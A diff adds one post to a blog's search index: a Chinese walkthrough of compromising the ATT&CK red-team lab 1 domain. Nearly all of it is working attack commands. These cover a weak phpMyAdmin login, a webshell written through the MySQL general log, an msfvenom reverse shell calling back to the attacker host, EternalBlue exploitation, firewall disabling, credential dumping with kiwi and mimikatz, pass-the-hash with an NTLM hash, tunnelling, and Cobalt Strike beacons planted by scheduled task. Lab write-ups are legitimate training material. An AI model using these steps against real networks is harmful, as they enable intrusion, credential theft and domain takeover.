@@ -2492,4 +2492,238 @@
         <tag>-后渗透</tag>
       </tags>
   </entry>
+  <entry>
+    <title>ATTCK1</title>
+    <url>/2024/03/12/ATTCK1/</url>
+    <content><![CDATA[<h1 id="渗透环境"><a href="#渗透环境" class="headerlink" title="渗透环境"></a>渗透环境</h1><p>攻击机 kali 192.168.6.142</p>
+<p>win7双网卡主机</p>
+<p>IP 192.168.6.185(后面关机了 192.168.6.187)</p>
+<p>内网ip 192.168.52.143</p>
+<p>Win2008</p>
+<p>内网ip 192.168.52.138</p>
+<p>Win2K3</p>
+<p>内网ip 192.168.52.141</p>
+<p>拓扑图</p>
+<img src="/2024/03/12/ATTCK1/image-20240312145310552.png" class="" title="image-20240312145310552">
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>扫描存活主机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+
+
+
+<p>扫描开放的端口</p>
+<img src="/2024/03/12/ATTCK1/image-20240311120532205.png" class="" title="image-20240311120532205">
+
+
+
+<p>对主机web端口进行目录扫描</p>
+<img src="/2024/03/12/ATTCK1/image-20240311151902874.png" class="" title="image-20240311151902874">
+
+
+
+
+
+<h1 id="渗透主机"><a href="#渗透主机" class="headerlink" title="渗透主机"></a>渗透主机</h1><p>弱口令进入 &#x2F;phpmyadmin&#x2F;index.php</p>
+<p>root</p>
+<p>root</p>
+<h2 id="into-oufile-写-shell"><a href="#into-oufile-写-shell" class="headerlink" title="into oufile 写 shell"></a>into oufile 写 shell</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>MySQL 对于导入导出的目录是有限制的，只允许指定的目录才能导入导出。</p>
+<p>此处变量值为 <code>NULL</code>，即没设置允许操作的目录，所以没法导出到文件。</p>
+<blockquote>
+<p><code>secure_file_priv</code> 有些设置选项:</p>
+<ul>
+<li><p>如果为空，不做目录限制，即任何目录均可以。</p>
+</li>
+<li><p>如果指定了目录，MySQL 会限制只能从该目录导入、或导出到该目录。目录必须已存在，MySQL 不会自动创建该目录。</p>
+</li>
+<li><p>如果设置为 <code>NULL</code>，MySQL 服务器禁止导入与导出功能。</p>
+</li>
+<li><p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p>
+<p>在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p>
+</li>
+</ul>
+</blockquote>
+<p>secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限</p>
+<p>如果为空，不做目录限制</p>
+<p>不允许写入</p>
+<img src="/2024/03/12/ATTCK1/image-20240311154059869.png" class="" title="image-20240311154059869">
+
+<h2 id="日志文件写-shell"><a href="#日志文件写-shell" class="headerlink" title="日志文件写 shell"></a>日志文件写 shell</h2><p>首先执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>观察general_log字段是否开启，以及日志路径位置</p>
+<p>如果权限很高更改general_log字段和日志路径位置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log = &quot;ON&quot;;</span><br><span class="line">set global general_log_file=&#x27;/var/www/html&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>这里更改日志路径时报错</p>
+<img src="/2024/03/12/ATTCK1/image-20240311153111237.png" class="" title="image-20240311153111237">
+
+<p>操作系统是windows</p>
+<img src="/2024/03/12/ATTCK1/image-20240311154308669.png" class="" title="image-20240311154308669">
+
+<p>更改目录试试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log_file=&#x27;C:\\phpStudy\\WWW\\ccc.php&#x27;;</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/12/ATTCK1/image-20240311154814283.png" class="" title="image-20240311154814283">
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&lt;?php eval($_POST[1])?&gt;&#x27; or SLEEP(11);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;&lt;?php eval($_POST[999]);?&gt;&quot; &gt;&gt; rrr.php</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2024/03/12/ATTCK1/image-20240311161104739.png" class="" title="image-20240311161104739">
+
+<h2 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h2><p>msfvenom 生成反向后门</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.6.142 LPORT=4444 -f exe -o reverse.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.6.142 LPORT=4444 -f exe -o reverse.exe</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑上传exe文件</p>
+<img src="/2024/03/12/ATTCK1/image-20240311163107257.png" class="" title="image-20240311163107257">
+
+
+
+<p><strong>msf开启监听模块</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp </span><br><span class="line">set LHOST 192.168.6.142</span><br><span class="line">set LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2024/03/12/ATTCK1/image-20240311161742905.png" class="" title="image-20240311161742905">
+
+<p>连接成功</p>
+<img src="/2024/03/12/ATTCK1/image-20240311202749034.png" class="" title="image-20240311202749034">
+
+<p>icponfig 发现内网网段</p>
+<img src="/2024/03/12/ATTCK1/image-20240311170212369.png" class="" title="image-20240311170212369">
+
+
+
+<h1 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h1><p>win7开启路由</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="扫描内网存活主机"><a href="#扫描内网存活主机" class="headerlink" title="扫描内网存活主机"></a>扫描内网存活主机</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/arp_scanner</span><br><span class="line">set SESSION 1</span><br><span class="line">set RHOSTS 192.168.52.120-150</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/12/ATTCK1/image-20240311173613245.png" class="" title="image-20240311173613245">
+
+
+
+<p>内网存活两台主机 </p>
+<p>192.168.52.138</p>
+<p>192.168.52.141</p>
+<h2 id="扫描内网存活主机端口"><a href="#扫描内网存活主机端口" class="headerlink" title="扫描内网存活主机端口"></a>扫描内网存活主机端口</h2><p>添加一条基于 Session 的路由</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">添加路由：run autoroute -s 192.168.52.0/24</span><br><span class="line">查看路由：run autoroute -p</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>利用添加的路由进行内网主机和端口扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">内网进行主机发现和端口扫描：use auxiliary/scanner/portscan/tcp </span><br><span class="line">set session 1</span><br><span class="line">set rhosts 192.168.52.135-145</span><br><span class="line">set ports 139,445,3389</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2024/03/12/ATTCK1/image-20240311204535432.png" class="" title="image-20240311204535432">
+
+<p>扫描结果</p>
+<img src="/2024/03/12/ATTCK1/image-20240311204656385.png" class="" title="image-20240311204656385">
+
+
+
+<p>内网存活两台主机 且139与445端口均开启</p>
+<h2 id="ms17-010永恒之蓝攻击win2008"><a href="#ms17-010永恒之蓝攻击win2008" class="headerlink" title="ms17-010永恒之蓝攻击win2008"></a>ms17-010永恒之蓝攻击win2008</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ms17-010</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set session 1</span><br><span class="line">set rhost 192.168.52.138</span><br><span class="line">set lhost 192.168.52.143</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>第一次攻击失败，关闭win7的防火墙</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/12/ATTCK1/image-20240311205709950.png" class="" title="image-20240311205709950">
+
+<p>攻击成功</p>
+<img src="/2024/03/12/ATTCK1/image-20240311210038578.png" class="" title="image-20240311210038578">
+
+<p>去掉乱码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure>
+
+
+
+<p>systeminfo</p>
+<img src="/2024/03/12/ATTCK1/image-20240311212717548.png" class="" title="image-20240311212717548">
+
+<p>域控主机已经被拿下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load kiwi</span><br><span class="line"></span><br><span class="line">该命令可以列举系统中的明文密码:</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/12/ATTCK1/image-20240312095857304.png" class="" title="image-20240312095857304">
+
+<p>得到win2008</p>
+<p>GOD\liukaifeng01</p>
+<p>base64.</p>
+<h2 id="win2008打开远程桌面"><a href="#win2008打开远程桌面" class="headerlink" title="win2008打开远程桌面"></a>win2008打开远程桌面</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h2><p>上传nps kali做服务端  win7做客户端</p>
+<p>搭建tcp隧道</p>
+<img src="/2024/03/12/ATTCK1/image-20240312095735218.png" class="" title="image-20240312095735218">
+
+<p>win7执行以下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npc.exe -server=192.168.6.142:8024 -vkey=1234567 -type=tcp</span><br></pre></td></tr></table></figure>
+
+
+
+<p>主机win+R mstsc连接 通过creds_all已经得到账号密码</p>
+<img src="/2024/03/12/ATTCK1/image-20240312095814463-17102089249351.png" class="" title="image-20240312095814463">
+
+<img src="/2024/03/12/ATTCK1/image-20240312095747947.png" class="" title="image-20240312095747947">
+
+
+
+<h1 id="win32系统横向"><a href="#win32系统横向" class="headerlink" title="win32系统横向"></a>win32系统横向</h1><p>上传mimikatz-master</p>
+<img src="/2024/03/12/ATTCK1/image-20240312101028751.png" class="" title="image-20240312101028751">
+
+
+
+<h2 id="mimikatz进行哈希传递攻击PtH-工作组"><a href="#mimikatz进行哈希传递攻击PtH-工作组" class="headerlink" title="mimikatz进行哈希传递攻击PtH(工作组)"></a><strong>mimikatz进行哈希传递攻击PtH(工作组)</strong></h2><p>以管理员身份打开</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line">sekurlsa::pth  /user:administrator /domain:GOD.ORG  /ntlm:176283a3a8a455cfc872025d684308f8</span><br></pre></td></tr></table></figure>
+
+<p>在域环境中，当我们获得了 域管理员组内用户 的NTLM哈希值，我们可以使用域内的一台主机用mimikatz对域内任何一台机器(包括域控)进行哈希传递攻击。执行完命令后，会弹出CMD窗口，在弹出的CMD窗口我们可以访问域内任何一台机器。前提是我们必须拥有域内任意一台主机的本地管理员权限和域管理员的密码NTLM哈希值。<strong>此时可以无需输入密码进行IPC$共享</strong></p>
+<p>ntml：176283a3a8a455cfc872025d684308f8</p>
+<img src="/2024/03/12/ATTCK1/image-20240312104705727.png" class="" title="image-20240312104705727">
+
+<img src="/2024/03/12/ATTCK1/image-20240312115730301.png" class="" title="image-20240312115730301">
+
+
+
+<h2 id="与CS联动"><a href="#与CS联动" class="headerlink" title="与CS联动"></a>与CS联动</h2><p><strong>转发上线内网主机</strong></p>
+<p>添加监听器</p>
+<img src="/2024/03/12/ATTCK1/image-20240312113038357.png" class="" title="image-20240312113038357">
+
+<p>生成后门</p>
+<p>先用cs连接win7，然后生成后门程序，复制粘贴到win2008</p>
+<img src="/2024/03/12/ATTCK1/image-20240312113201140.png" class="" title="image-20240312113201140">
+
+
+
+
+
+<p>使用IPC命令将后门文件复制到win32</p>
+<p>copy beacon 192.168.52.141\admin$</p>
+<p>设置定时任务</p>
+<p>at \\192.168.52.141 11:16 beacon.exe</p>
+<img src="/2024/03/12/ATTCK1/image-20240312120158264.png" class="" title="image-20240312120158264">
+
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># portscan ip 端口</span><br><span class="line">portscan 192.168.52.141 3333</span><br><span class="line">connect 192.168.52.141 3333</span><br></pre></td></tr></table></figure>
+
+<p>连接成功</p>
+<img src="/2024/03/12/ATTCK1/image-20240312113424011.png" class="" title="image-20240312113424011">
+
+<p>此时Win2K3也已经成功拿下</p>
+]]></content>
+  </entry>
 </search>
